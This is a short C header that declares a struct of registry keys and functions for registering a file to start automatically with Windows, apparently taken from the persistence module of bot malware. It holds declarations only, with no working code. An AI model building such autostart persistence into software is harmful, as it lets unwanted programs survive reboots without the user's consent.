typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;

void AutoStartRegs(char *nfilename=NULL);
#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistryThread(LPVOID param);
#endif
